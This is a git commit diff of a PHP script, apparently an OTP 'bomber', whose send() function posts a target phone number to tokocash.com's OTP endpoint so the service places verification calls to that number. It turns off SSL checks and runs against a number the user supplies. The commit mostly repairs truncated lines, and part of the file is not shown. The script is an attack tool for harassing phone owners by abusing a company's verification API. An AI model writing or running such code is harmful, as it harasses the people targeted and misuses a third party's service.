ccd1b4367e2c66f602bf6350ed3f3ef098770b4f
Rayaprakyat <48251738+totonngesot@users.noreply.github.com>
2019-03-06 23:42:26 +0700

    Update ganteng.php

--- ganteng.php
+++ ganteng.php
@@ -1,21 +1,13 @@
-
-
-
-
-
-
-
-
 <?php
 // SANTET SECUKUPNYA
 function send($phone){
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");      $
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_HEADER, true);
         curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");        $
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
         curl_close($ch);
                 echo $asw."\n";
 }
@@ -37,6 +29,9 @@ if($cek=="n") exit("Stopped!\n");
 $execute = send($nomor);
 print $execute;
 ?>
+
+
+
 
 
 
